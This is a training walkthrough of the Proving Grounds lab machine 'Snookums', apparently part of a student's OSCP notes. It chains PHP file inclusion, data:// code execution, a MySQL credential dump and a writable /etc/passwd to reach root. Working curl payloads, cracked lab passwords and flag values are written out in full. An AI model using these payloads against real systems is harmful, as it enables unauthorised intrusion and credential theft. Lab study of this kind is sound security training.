---
aliases: ["Snookums", "snookums-pg"]
tags: [oscp, box, linux, medium]
---

# PG: Snookums, Full Walkthrough (Ping to Root)

## Tags
#PG #Snookums #Linux #WebApp #LFI #RFI #DataWrapper #MySQL #WritablePasswd #Medium

---

## Box Info

**Target:** `192.168.119.58` (swap for your instance IP) · **Difficulty:** Medium · **OS:** Linux (CentOS, Apache/PHP) · **Platform:** Proving Grounds Practice

**The gist:** CentOS box running Simple PHP Photo Gallery v0.8 on Apache 2.4.6 / PHP 5.4.16. The `image.php?img=` parameter passes user input directly into `include()` with no sanitisation — an LFI/RFI. Outbound TCP and new listening ports are both blocked (SELinux `httpd_t` + firewall), so reverse and bind shells fail. Instead: use the `data://` stream wrapper to execute PHP payloads in-URL, read MySQL root creds from `db.php`, dump the `users` table via the `mysql` CLI through `shell_exec`, double-decode the base64-of-base64 passwords, SSH in as `michael`, and write a UID-0 entry to a world-owned `/etc/passwd` for root.

---

## 1. Recon: Port Scan

**Full port scan:**
```bash
sudo nmap -p- --min-rate 5000 -oA nmap/${BoxName}_allports $BoxIP
```

Results:

| Port | Service |
|------|---------|
| 21/tcp | FTP (vsftpd 3.0.2, anonymous login) |
| 22/tcp | SSH (OpenSSH 7.4) |
| 80/tcp | HTTP (Apache 2.4.6 / PHP 5.4.16) |
| 139/tcp | NetBIOS-SSN (Samba 4.10.4) |
| 445/tcp | SMB (Samba 4.10.4) |
| 3306/tcp | MySQL (unauthorized — 127.0.0.1 only) |

> 📸 `nmap-allports.png`

**Service scan:**
```bash
sudo nmap -p 21,22,80,139,445,3306 -sV -sC -oA nmap/${BoxName}_services $BoxIP
```

Key findings:
- **Port 80:** Apache 2.4.6, PHP/5.4.16 — `Simple PHP Photo Gallery v0.8` (confirmed by README.txt, page footer)
- **Port 21:** FTP anonymous login works but data channel is firewalled — listing and uploads both hang
- **Port 3306:** MySQL present but `Host 'x.x.x.x' is not allowed to connect` — localhost only
- **Port 139/445:** Samba 4.10.4 — only `print$` and `IPC$`, nothing useful

> 📸 `nmap-services.png`

---

## 2. Web Enumeration

**Directory brute-force:**
```bash
gobuster dir -u http://$BoxIP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,txt -o gobuster/${BoxName}_root.txt
```

Found PHP files: `index.php`, `image.php`, `embeddedGallery.php`, `db.php`, `functions.php`, `photos/`

**nikto scan:**
```bash
nikto -h http://$BoxIP | tee nikto/${BoxName}_nikto.txt
```
Revealed `/images/` directory indexing, `/db.php` flagged as interesting. No automatic RFI detection.

**Parameter fuzzing (critical step):**

Gobuster found the files but not the vulnerable parameter. Spray GET parameter names against all PHP files using ffuf:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "http://$BoxIP/image.php?FUZZ=php://filter/convert.base64-encode/resource=image.php" \
  -fs 1508 -t 50 -s
```

Hit: **`img`** — the response size changed, confirming an include() call was triggered.

> 📸 `lfi-imagephp.png`

---

## 3. LFI: Reading PHP Source via php://filter

With the vulnerable parameter identified, use `php://filter` to read PHP source files in base64:

**Read image.php source:**
```bash
curl -s "http://$BoxIP/image.php?img=php://filter/convert.base64-encode/resource=image.php" \
  | grep -oP '[A-Za-z0-9+/]{200,}={0,2}' | base64 -d | grep -n "include" -B 5 -A 5
```

Decoded source confirms the vulnerability at line 181:
```php
$image = $_GET['img'];      // no sanitisation
// ...
include($image);            // direct include of user input
```

**Read db.php (MySQL credentials):**
```bash
curl -s "http://$BoxIP/image.php?img=php://filter/convert.base64-encode/resource=db.php" \
  | grep -oP '[A-Za-z0-9+/]{20,}={0,2}' | tail -1 | base64 -d
```

Output:
```php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');
```

> 📸 `lfi-dbcreds.png`

---

## 4. RCE via data:// Stream Wrapper

The `include($image)` path also allows remote code execution via PHP's `data://` stream wrapper, which requires only `allow_url_include = On` and needs no outbound network connection (unlike `http://` RFI which is firewalled).

**Critical operational note — URL encode `+` in base64:**
Base64 output may contain `+` characters. In URL query strings, `+` is decoded as a space on the server, corrupting the PHP payload. Always run:
```bash
| sed 's/+/%2B/g'
```
after `base64 -w0` before embedding in a URL.

**Proof of execution:**
```bash
PAYLOAD=$(echo -n '<?php echo shell_exec("id"); ?>' | base64 -w0 | sed 's/+/%2B/g')
curl -s "http://$BoxIP/image.php?img=data://text/plain;base64,$PAYLOAD"
```

Returns: `uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0`

> 📸 `rce-data.png`

**Why reverse/bind shells fail:**

The SELinux context `httpd_t` blocks both:
- Outbound TCP connections from apache (reverse shell)
- Binding on new ports (bind shell)

No PHP MySQL extension installed (PDO = NO, mysqli = NO). Use the `mysql` CLI binary via `shell_exec` instead.

> [!warning] 💡 Hint
> **Watch out:** A successful local PHP command does not prove that networking works. The SELinux web-server context can block shells even when commands such as `id` execute correctly.

---

## 5. MySQL Enumeration via shell_exec

**Show tables:**
```bash
PAYLOAD=$(echo -n '<?php echo "###"; echo shell_exec("mysql -h 127.0.0.1 -u root -pMalapropDoffUtilize1337 SimplePHPGal -e \"SHOW TABLES;\" 2>&1"); echo "###"; ?>' | base64 -w0 | sed 's/+/%2B/g')
curl -s "http://$BoxIP/image.php?img=data://text/plain;base64,$PAYLOAD" | tr '\n' ' ' | grep -oP '###\K[^#]+'
```

Output: `Tables_in_SimplePHPGal users`

**Dump users table:**
```bash
PAYLOAD=$(echo -n '<?php echo "###"; echo shell_exec("mysql -h 127.0.0.1 -u root -pMalapropDoffUtilize1337 SimplePHPGal -e \"SELECT * FROM users;\" 2>&1"); echo "###"; ?>' | base64 -w0 | sed 's/+/%2B/g')
curl -s "http://$BoxIP/image.php?img=data://text/plain;base64,$PAYLOAD" | tr '\n' ' ' | grep -oP '###\K[^#]+'
```

Output:
```
username    password
josh        VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=
michael     U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==
serena      VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE5PQ==
```

> 📸 `mysql-users.png`

---

## 6. Decoding Double-Encoded Passwords

Passwords are base64 of base64. Decode twice:

```bash
echo "VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=" | base64 -d | base64 -d && echo
echo "U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==" | base64 -d | base64 -d && echo
echo "VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE5PQ==" | base64 -d | base64 -d && echo
```

Results:
| Username | Password |
|----------|----------|
| josh | `MobilizeHissSeedtime747` |
| michael | `HockSydneyCertify123` |
| serena | `OverallCrestLean000` |

> 📸 `decoded-passwords.png`

---

## 7. SSH Foothold

```bash
ssh michael@$BoxIP
# password: HockSydneyCertify123
```

> 📸 `foothold.png`

User flag: `fd55df96238f52302cee761078e75925`

> 📸 `user-flag.png`

---

## 8. Privilege Escalation: Writable /etc/passwd

**Discovery:**
```bash
ls -la /etc/passwd
# -rw-r--r--. 1 michael root 1162 Jun 22  2021 /etc/passwd
```

michael **owns** `/etc/passwd` (rw- for owner). Not a misconfigured world-write — the file is actually owned by the web app user.

> 📸 `privesc-finding.png`

**Exploitation:**

Generate a password hash on Kali:
```bash
openssl passwd -1 -salt xyz hacked
# $1$xyz$pQmJ8Si2jyYwrx4VHjY2x0
```

Append a UID-0 user (single quotes to protect `$` signs):
```bash
echo 'hacked:$1$xyz$pQmJ8Si2jyYwrx4VHjY2x0:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacked
# password: hacked
```

> 📸 `privesc-exploit.png`

Root shell as: `[root@snookums ~]#`

> 📸 `root-shell.png`

Root flag: `8720692461d3b48c3cc2353701f396d7`

> 📸 `root-flag.png`
> 📸 `PROOF.png`

---

## 9. Credentials Found

| Username | Password | Service | Notes |
|----------|----------|---------|-------|
| root | MalapropDoffUtilize1337 | MySQL | From db.php LFI |
| josh | MobilizeHissSeedtime747 | (didn't work for SSH) | Double base64 decoded |
| michael | HockSydneyCertify123 | SSH | Double base64 decoded |
| serena | OverallCrestLean000 | (not tried) | Double base64 decoded |

---

## 10. Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scan + service detection |
| gobuster | Directory + file enumeration |
| nikto | Automated web vulnerability scan |
| ffuf | GET parameter fuzzing (`burp-parameter-names.txt`) |
| curl + php://filter | LFI source file reading |
| curl + data:// | In-URL PHP code execution (no network needed) |
| mysql CLI (via shell_exec) | MySQL query when no PHP extension available |
| openssl passwd | Password hash generation for /etc/passwd write |

---

## 11. Vulnerabilities Summary

| # | Vulnerability | Severity | Location |
|---|--------------|----------|----------|
| 1 | Unsanitised `include()` on `image.php?img=` | Critical | HTTP/80 |
| 2 | MySQL root credentials in world-readable `db.php` | High | HTTP/80 |
| 3 | Double-encoded passwords in DB (trivially decoded) | High | MySQL/3306 |
| 4 | `/etc/passwd` owned by web app user | Critical | Filesystem |

---

## 12. Lessons Learned / Module Links

- **Hidden parameter fuzzing** is as important as directory brute-force. Gobuster found the files; ffuf found the vulnerable param inside them. → [[09. Common Web Application Attacks]]
- **`data://` wrapper** is the go-to when `http://` RFI is firewalled and `allow_url_include` is On. No outbound connection needed — the payload lives in the URL. → [[09. Common Web Application Attacks]]
- **`+` in base64 must be URL-encoded as `%2B`** when embedding base64 payloads in GET parameters — `+` decodes as a space in query strings and silently corrupts the payload.
- **No PHP MySQL extension?** Fall back to the `mysql` CLI binary via `shell_exec`. Check with `function_exists("mysqli_connect")` first.
- **SELinux `httpd_t` blocks reverse and bind shells** — always check the SELinux context from `id` output. When `httpd_t` is present, plan for no network shells and work through the web channel instead.
- **`/etc/passwd` owned by an unprivileged user** is a classic but still appears. Append a UID-0 row, `su` to it. → [[18. Linux Privilege Escalation]]

---

## 13. External Resources

| Resource | Link | Relevant to this box |
|---|---|---|
| HackTricks — File Inclusion | [src/pentesting-web/file-inclusion/README.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/README.md) | Section "LFI / RFI using PHP wrappers & protocols" — `php://filter` and `data://` covered in depth. Local: `ht read pentesting-web/file-inclusion` |
| PayloadsAllTheThings — Wrappers | [File Inclusion/Wrappers.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md) | Every PHP stream wrapper with payload examples — `data://` section shows the base64 RCE pattern used on this box |
| PayloadsAllTheThings — File Inclusion | [File Inclusion/](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) | LFI bypass techniques; also LFI2RCE paths (log poisoning, session, uploads) for when `data://` isn't available |
| HackTricks — Linux PrivEsc | [linux-hardening/.../linux-privilege-escalation/README.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/linux-hardening/linux-basics/linux-privilege-escalation/README.md) | "Writable /etc/passwd" section — alternative payload formats (no-password entry `dummy::0:0:...`). Local: `ht read linux-hardening/linux-basics/linux-privilege-escalation` |
| PayloadsAllTheThings — Linux PrivEsc | [Linux - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) | Writable /etc/passwd section; broader Linux privesc methodology |
| GTFOBins | [gtfobins.github.io](https://gtfobins.github.io) | Not used here directly — reference if privesc leads to a SUID/sudo binary instead |
| RevShells | [revshells.com](https://www.revshells.com) | PHP reverse shell payloads — **not applicable here** (SELinux `httpd_t` blocks outbound TCP); reference for targets without SELinux |
| CyberChef | [Double base64 decode recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)) | Decode the double-encoded passwords from the `users` table — "From Base64" twice |
| ippsec.rocks | Search [php wrapper](https://ippsec.rocks/?#php%20wrapper) · [lfi](https://ippsec.rocks/?#lfi) · [writable passwd](https://ippsec.rocks/?#writable%20passwd) | Video walkthroughs of the same techniques on real HTB boxes |

---

## 14. Vault Update Checklist

- [x] **Write-up**: this file
- [x] **Related Boxes**: added Snookums to module notes for [[09. Common Web Application Attacks]] and [[18. Linux Privilege Escalation]]
- [x] **MASTER BOX LIST**: added row
- [x] **Runbook `box_sources`**: added Snookums to `Web App - LFI`, `Web App - RFI` (new), `PrivEsc Linux - Writable Passwd` (new)
- [x] **Methodology cheat sheet**: added owner-writable /etc/passwd note to Linux Methodology
- [x] **External Resources**: section added to write-up, all three runbook stage notes
## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [GTFOBins](https://gtfobins.github.io/) for Linux privilege escalation
- [RevShells](https://www.revshells.com/) for shell payloads
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
## RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Linux - LFI]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - RFI]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - RCE to Shell]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - Credential Search]] -- technique used in this walkthrough

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- shares a similar enumeration or escalation pattern
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.

## Attack Chain

1. [[RUNBOOK V2/Linux - LFI]] read PHP source through the image parameter.
2. [[RUNBOOK V2/Linux - RFI]] used PHP stream wrappers when normal shell delivery was blocked.
3. [[RUNBOOK V2/Linux - RCE to Shell]] used the application to query the database and obtain a foothold credential.
4. [[RUNBOOK V2/Linux - Credential Search]] found a writable password file and used a UID-0 account to reach root.

## Flags

- `user.txt`: `$UserFlag` (keep the value private)
- `root.txt`: `$RootFlag` (keep the value private)
- `proof.txt`: `$ProofFlag` (keep the value private)

## Lessons Learned

- A failed reverse shell does not disprove code execution when egress controls are present.
- PHP wrappers can provide both source disclosure and execution, depending on the wrapper and sink.
